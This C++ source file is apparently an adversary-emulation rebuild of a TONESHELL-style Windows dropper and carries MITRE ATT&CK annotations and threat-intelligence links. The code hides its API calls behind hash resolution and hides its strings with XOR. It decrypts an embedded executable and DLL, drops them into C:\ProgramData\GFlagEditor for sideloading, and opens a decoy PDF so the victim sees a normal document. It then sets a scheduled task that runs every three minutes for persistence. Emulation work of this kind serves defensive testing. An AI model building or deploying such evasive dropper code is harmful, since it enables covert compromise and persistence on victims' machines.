#include "dropper_util.hpp"
#include "util.hpp"
#include "xor.hpp"
#include "d_embedded.hpp"
#include "e_embedded.hpp"
#include "obfuscation.hpp"

#ifndef DROPPER_LOG_FILE
#error "main.cpp must have DROPPER_LOG_FILE set at compile time"
#endif

/*
 * DropEmbeddedComponent:
 *      About:
 *          Decrypts the provided component data and writes it to disk at the specified location.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1140: Deobfuscate/Decode Files or Information
 *      CTI:
 *          https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit
 */
DWORD DropEmbeddedComponent(shared_func_pointers* fp, logger_ctx* log_ctx, LPCWSTR dest, const uint8_t* enc_key, const uint8_t* data, size_t payload_size) {
    DWORD result;

    VirtualAlloc_t fp_VirtualAlloc = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualAlloc);
    if (!fp_VirtualAlloc) {
        return FAIL_GET_VIRTUALALLOC;
    }
    VirtualFree_t fp_VirtualFree = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualFree);
    if (!fp_VirtualFree) {
        return FAIL_GET_VIRTUALFREE;
    }

    // Decrypt XOR key
    AesLogger::LogDebug(log_ctx, XorString("Decrypting XOR key."));
    unsigned char key[PAYLOAD_KEY_LEN];
    memcpy(key, enc_key, PAYLOAD_KEY_LEN);
    encryption::XorInPlace(key, PAYLOAD_KEY_LEN, KEY_XOR_KEY);

    // Grab encrypted component
    AesLogger::LogDebug(log_ctx, XorString("Allocating buffer."));
    LPVOID buffer = fp_VirtualAlloc(NULL, payload_size, MEM_COMMIT, PAGE_READWRITE);
    if (buffer == NULL) {
        result = fp->fp_GetLastError();
        AesLogger::LogError(log_ctx, XorString("Failed to allocate memory for buffer. Error code: %d"), result);
        return result;
    }

    HANDLE h_file = NULL;
    do {
        // Populate buffer with the payload and decrypt it
        AesLogger::LogDebug(log_ctx, XorString("Decrypting buffer."));
        memcpy(buffer, data, payload_size);
        encryption::TripleXorInPlace((unsigned char*)buffer, payload_size, key, PAYLOAD_KEY_LEN);

        // Write decrypted blob to disk
        h_file = fp->fp_CreateFileW(
            dest,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (h_file == INVALID_HANDLE_VALUE) {
            result = fp->fp_GetLastError();
            AesLogger::LogError(log_ctx, XorString("Failed to open destination file. Error code: %d"), result);
            break;
        }

        result = WriteFileBytes(
            fp,
            h_file,
            reinterpret_cast<char*>(buffer),
            payload_size
        );
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(log_ctx, XorString("Failed to write to destination file. Error code: %d"), result);
            break;
        }
    } while (false);

    if (buffer != NULL) {
        fp_VirtualFree(buffer, 0, MEM_RELEASE);
    }

    if (h_file != NULL && h_file != INVALID_HANDLE_VALUE) {
        fp->fp_CloseHandle(h_file);
    }

    return result;
}

/*
 * OpenDecoyPDF:
 *      About:
 *          Opens the decoy PDF from the expected location "..\Appendix II\Assessing Westeros-Essos Global Influence (1).pdf"
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *      CTI:
 *          https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit
 */
DWORD OpenDecoyPDF(dropper_func_pointers* fp, logger_ctx* log_ctx) {
    DWORD result;

    // Get path to PDF
    wchar_t path_buf[MAX_PATH + 1];
    if (fp->fp_GetModuleFileNameW(NULL, path_buf, MAX_PATH) == 0) {
        result = fp->shared_fp.fp_GetLastError();
        AesLogger::LogError(log_ctx, XorString("Failed to get path to current executable. Error code: %d"), result);
        return result;
    }
    ConcatToParent(path_buf, MAX_PATH + 1, XorStringW(L"Appendix II\\Assessing Westeros-Essos Global Influence (1).pdf"));

    // Open PDF
    AesLogger::LogInfo(log_ctx, XorString("Opening PDF."));
    INT_PTR pdf_result = (INT_PTR)fp->fp_ShellExecuteW(
        NULL,
        XorStringW(L"open"),
        path_buf,
        NULL,
        NULL,
        SW_NORMAL
    );
    if (pdf_result == ERROR_FILE_NOT_FOUND) {
        AesLogger::LogError(log_ctx, XorString("ERROR_FILE_NOT_FOUND: PDF file not found."));
        return ERROR_FILE_NOT_FOUND;
    } else if (pdf_result == ERROR_PATH_NOT_FOUND) {
        AesLogger::LogError(log_ctx, XorString("PDF file path not found."));
        return ERROR_PATH_NOT_FOUND;
    } else if (pdf_result == SE_ERR_FNF) {
        AesLogger::LogError(log_ctx, XorString("SE_ERR_FNF: PDF file not found."));
        return ERROR_PATH_NOT_FOUND;
    } else if (pdf_result <= 32) {
        result = fp->shared_fp.fp_GetLastError();
        AesLogger::LogError(log_ctx, XorString("Failed to open PDF. Error code: %d"), result);
        return result;
    }
    return ERROR_SUCCESS;
}

/*
 * wmain:
 *      About:
 *          If C:\ProgramData\GFlagEditor does not exist, creates the directory
 *          and drops embedded DLL and legitimate binary there (decrypted from embedded data).
 *          Opens the decoy PDF at "..\Appendix II\Assessing Westeros-Essos Global Influence (1).pdf".
 *          Creates a scheduled task to execute the legitimate binary every 3 minutes:
 *              schtasks /F /create /TN GFlagEditor /SC minute /MO 3  /TR C:\ProgramData\GFlagEditor\gflags.exe
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *          T1027.007: Obfuscated Files or Information: Dynamic API Resolution
 *          T1027.009: Obfuscated Files or Information: Embedded Payloads
 *          T1053.005: Scheduled Task/Job: Scheduled Task
 *          T1083: File and Directory Discovery
 *      CTI:
 *          https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit
 */
int wmain() {
    dropper_func_pointers fp;
    logger_ctx log_ctx;

    // Resolve APIs required for logging and other basic tasks
    DWORD result = ResolveSharedApis(&(fp.shared_fp));
    if (result != ERROR_SUCCESS) {
        return result;
    }

    result = AesLogger::InitializeLogger(&(fp.shared_fp), XorStringW(WIDEN(DROPPER_LOG_FILE)), ENCRYPTED_LOGGING, &log_ctx);
    if (result != ERROR_SUCCESS) {
        return result;
    }

    do {
        AesLogger::LogInfo(&log_ctx, XorString("==================="));
        AesLogger::LogInfo(&log_ctx, XorString("Initialized logger."));
        AesLogger::LogInfo(&log_ctx, XorString("==================="));

        // Resolve additional APIs
        result = ResolveDropperAPIs(&fp, &log_ctx);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&log_ctx, XorString("Failed to resolve dropper APIs. Error code: %d"), result);
            break;
        }

        // Create folder to drop components into
        AesLogger::LogInfo(&log_ctx, XorString("Creating destination directory."));
        if (!fp.fp_CreateDirectoryW(XorStringW(L"C:\\ProgramData\\GFlagEditor"), NULL)) {
            result = fp.shared_fp.fp_GetLastError();
            if (result == ERROR_ALREADY_EXISTS) {
                AesLogger::LogDebug(&log_ctx, XorString("Directory already exists."));
                result = ERROR_SUCCESS;
            } else {
                AesLogger::LogError(&log_ctx, XorString("Failed to create directory. Error code: %d"), result);
                break;
            }
        } else {
            // Only drop if directory was newly created
            AesLogger::LogInfo(&log_ctx, XorString("Dropping EXE."));
            result = DropEmbeddedComponent(
                &(fp.shared_fp),
                &log_ctx,
                XorStringW(L"C:\\ProgramData\\GFlagEditor\\gflags.exe"),
                exe_embed::payload_key.data(),
                exe_embed::payload.data(),
                exe_embed::payload.size()
            );
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&log_ctx, XorString("Failed to drop executable. Error code: %d"), result);
                break;
            }

            AesLogger::LogInfo(&log_ctx, XorString("Dropping DLL."));
            result = DropEmbeddedComponent(
                &(fp.shared_fp),
                &log_ctx,
                XorStringW(L"C:\\ProgramData\\GFlagEditor\\gflagsui.dll"),
                dll_embed::payload_key.data(),
                dll_embed::payload.data(),
                dll_embed::payload.size()
            );
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&log_ctx, XorString("Failed to drop DLL. Error code: %d"), result);
                break;
            }
        }

        // Open decoy PDF. If it fails, continue anyway.
        result = OpenDecoyPDF(&fp, &log_ctx);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&log_ctx, XorString("Failed to open decoy PDF. Error code: %d. Continuing execution."), result);
        }

        // Create scheduled task for persistence/execution
        AesLogger::LogDebug(&log_ctx, XorString("Creating scheduled task to execute legitimate binary."));
        DWORD exit_code;
        result = CreateAndWaitForProcess(
            &fp,
            &log_ctx,
            XorStringW(L"schtasks /F /create /TN GFlagEditor /SC minute /MO 3  /TR C:\\ProgramData\\GFlagEditor\\gflags.exe"),
            &exit_code
        );
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&log_ctx, XorString("Failed create and wait for schtasks process. Error code: %d"), result);
        } else if (exit_code != 0) {
            AesLogger::LogError(&log_ctx, XorString("schtasks process failed with non-0 exit code: %d"), exit_code);
        } else {
            AesLogger::LogInfo(&log_ctx, XorString("Successfully created scheduled task."));
        }
    } while(false);

    AesLogger::CloseLogger(&log_ctx);
    return result;
}
